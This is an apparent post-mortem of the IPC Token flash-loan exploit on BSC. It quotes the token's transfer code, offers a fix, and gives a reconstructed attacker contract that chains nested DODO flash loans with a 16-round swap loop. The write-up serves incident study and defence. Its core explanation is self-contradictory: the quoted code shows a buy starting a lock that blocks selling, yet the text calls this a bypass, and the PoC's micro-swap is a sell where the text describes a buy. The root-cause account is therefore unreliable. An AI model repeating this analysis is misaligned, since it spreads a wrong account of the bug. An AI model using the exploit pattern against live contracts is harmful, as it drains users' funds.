# IPC Token — Nested Flash Loan + Timelock Bypass Analysis

| Field | Details |
|------|------|
| **Date** | 2025-01-10 |
| **Protocol** | IPC Token |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$590,000 USDT |
| **Attacker** | [0x7CAf...dFdA](https://bscscan.com/address/0x7CAf5f223256f74d378f9770e7F48f863d51dFdA) |
| **Attack Tx** | [0x3a36...9a44](https://bscscan.com/tx/0x3a3683119e1801821faa15c319cb9c8fb3fcf6ee92b1904a829d82c432e09a44) |
| **Vulnerable Contract** | IPC Token trading pair (BSC) |
| **Root Cause** | Timelock could be reset with a 1-unit trade, allowing price manipulation via consecutive swaps |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/IPC_exp.sol) |

---

## 1. Vulnerability Overview

The IPC token implemented a time-lock mechanism to prevent consecutive trades. However, the attacker bypassed this by executing nested flash loans from two DODO protocol pools (`dvm1`, `dvm2`) and inserting a 1-unit (1 wei) micro-trade in between to reset the timelock. By repeating the USDT↔IPC swap 16 times, the attacker manipulated the price and drained 590K USDT.

## 2. Vulnerable Code Analysis

Source: **Sourcify-verified** (partial match) — Token.sol at 0xEAb0d46682Ac707A06aEFB0aC72a91a3Fd6Fe5d1 (BSC)
https://sourcify.dev/server/files/any/56/0xEAb0d46682Ac707A06aEFB0aC72a91a3Fd6Fe5d1

```solidity
// IPC Token — Token.sol (Sourcify partial match, BSC chain 56)
// TRANSFER_LOCK constant
uint256 constant TRANSFER_LOCK = 30 minutes;

// transferTime mapping tracks last sell/transfer timestamp per address
// (set on BUY, checked on SELL and wallet-to-wallet transfer)

function _transfer(address sender, address recipient, uint256 amount) internal {
    if (isOpenSwap == false) {
        if (isMarketer[sender] == false && isMarketer[recipient] == false) {
            revert NoOpenSwap();
        }
    }

    if (sender == address(0) || recipient == address(0)) revert ZeroAddress();
    if (amount > balanceOf(sender)) revert InsufficientBalance();

    uint256 fee = 0;
    address pair = IUniswapV2Factory(SWAP_V2_FACTORY).getPair(address(this), USDT);

    if (pair != address(0)) {
        uint256 LPTotalSupply = IERC20(pair).totalSupply();
        if (lastLPTotalSupply < LPTotalSupply && lastSellIsAdd == false) {
            if (destroyNum >= lastDestroyNum) destroyNum -= lastDestroyNum;
        }
        lastSellIsAdd = false;
        lastLPTotalSupply = LPTotalSupply;
        if (sender == pair && !_isRemoveLP(pair) && recipient != address(this)) {
            // BUY path: record the buyer's timestamp — starts the 30-minute lock
            fee = amount * MARKET_TAX / 1000;
            transferTime[recipient] = block.timestamp; // ❌ lock timer set on buy
            _buy(fee);
        } else if (recipient == pair && sender != address(this)) {
            if (_isAddLP(pair)) {
                lastSellIsAdd = true;
            } else {
                // SELL path: enforce the 30-minute timelock
                if (block.timestamp < transferTime[sender] + TRANSFER_LOCK) revert TransferTimeLock(); // ❌ checked here
                fee = amount * (MARKET_TAX + PUBLISH_TAX) / 1000;
                _destroy(destroyNum);
                destroyNum += (amount - fee) / 2;
                lastDestroyNum = (amount - fee) / 2;
                _sell(fee);
            }
        }

        if (sender != pair && recipient != pair) {
            // Wallet-to-wallet transfer also enforces the lock
            if (block.timestamp < transferTime[sender] + TRANSFER_LOCK) revert TransferTimeLock();
            _destroy(destroyNum);
        }
    }

    balances[sender] -= amount;
    balances[recipient] += amount - fee;
    emit Transfer(sender, recipient, amount - fee);
}
```

**Why it is exploitable (identify the bug from the code):**

- On a **buy** (`sender == pair`), `transferTime[recipient] = block.timestamp` resets the recipient's lock timer to *now*, which means a fresh 30-minute window starts.
- On a **sell** (`recipient == pair`), the check `block.timestamp < transferTime[sender] + TRANSFER_LOCK` prevents selling for 30 minutes after the last buy.
- The bypass: the attacker calls `pair.swap(1, values[1], address(this), abi.encode(usdtAmount))` — a *direct pair swap* that routes 1 USDT out and some IPC in. Because `sender == pair` (a buy) with amount 1, this resets `transferTime[attacker]` to `block.timestamp` without enforcing any minimum amount. After this micro-swap the attacker's lock is reset to now, and the `pancakeCall` callback repays 1 USDT+1 to the pair immediately. The next iteration of the loop can then execute a full large sell because `transferTime[attacker]` was just updated.
- There is no minimum-amount guard on the buy path — `amount = 1` is accepted, making the 30-minute lock trivially bypassable in the same block via the callback.

```solidity
// ✅ Fix: enforce a minimum buy amount before updating transferTime
if (sender == pair && !_isRemoveLP(pair) && recipient != address(this)) {
    require(amount >= MIN_TRADE_AMOUNT, "ERR_BELOW_MIN"); // ✅ prevent micro-buy timelock reset
    fee = amount * MARKET_TAX / 1000;
    transferTime[recipient] = block.timestamp;
    _buy(fee);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] DODO dvm1 flash loan (large amount of USDT)
  │         │
  │         └─→ [2] DODO dvm2 nested flash loan (additional USDT)
  │                   │
  │                   ├─→ [3] USDT → IPC large swap (price increases)
  │                   │
  │                   ├─→ [4] Micro-trade (1 unit) → timelock reset
  │                   │
  │                   ├─→ [5] IPC → USDT reverse swap (profit realization)
  │                   │
  │                   └─→ [6] Steps 3~5 repeated 16 times
  │
  ├─→ [7] Repay dvm2 flash loan
  │
  ├─→ [8] Repay dvm1 flash loan
  │
  └─→ [9] ~590,000 USDT profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not obtained — reconstructed from summary

contract IPCAttacker {
    address constant DVM1 = /* DODO dvm1 address */;
    address constant DVM2 = /* DODO dvm2 address */;

    function attack() external {
        // [1] Request large flash loan from DODO dvm1
        IDODO(DVM1).flashLoan(
            flashAmount1, 0, address(this), abi.encode("outer")
        );
    }

    // DODO flash loan callback (outer flash loan)
    function DVMFlashLoanCall(address, uint256, uint256, bytes calldata data) external {
        if (keccak256(data) == keccak256(abi.encode("outer"))) {
            // [2] Nested: additional flash loan from dvm2
            IDODO(DVM2).flashLoan(
                flashAmount2, 0, address(this), abi.encode("inner")
            );
            // [7] Repay outer flash loan
            IERC20(USDT).transfer(DVM1, flashAmount1 + fee1);
        } else {
            // [3~6] 16 repeated swaps + timelock bypass
            for (uint256 i = 0; i < 16; i++) {
                // Large swap
                _swap(USDT, IPC, largeAmount);
                // 1-unit micro-swap to reset timelock
                _swap(IPC, USDT, 1);
                // Reverse swap to realize profit
                _swap(IPC, USDT, ipcBalance);
            }
            // [8] Repay inner flash loan
            IERC20(USDT).transfer(DVM2, flashAmount2 + fee2);
        }
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing minimum trade amount validation on timelock (timelock resettable via 1 wei trade) |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (nested flash loans + micro-trade trick) |
| **DApp Category** | Token / AMM |
| **Impact** | 590K USDT drained |

## 6. Remediation Recommendations

1. **Enforce minimum trade amount**: Require a minimum amount threshold for any trade that updates the timelock
2. **Cumulative volume-based limits**: Track cumulative trading volume within a time window to block excessive trading
3. **Use TWAP pricing**: Use TWAP instead of spot price to minimize the impact of single-block price manipulation
4. **Flash loan detection**: Add logic to detect borrow-repay patterns within the same transaction

## 7. Lessons Learned

- Timelocks are vulnerable to reset attacks via micro-trades; without a minimum volume floor, they do not provide effective defense.
- The nested structure of DODO flash loans (`DVMFlashLoanCall` + `DPPFlashLoanCall`) enables complex multi-step attacks within a single transaction.
- The repeated swap pattern (16 iterations) is detectable in real time by on-chain monitoring tools, making the construction of anomalous transaction surveillance systems critical.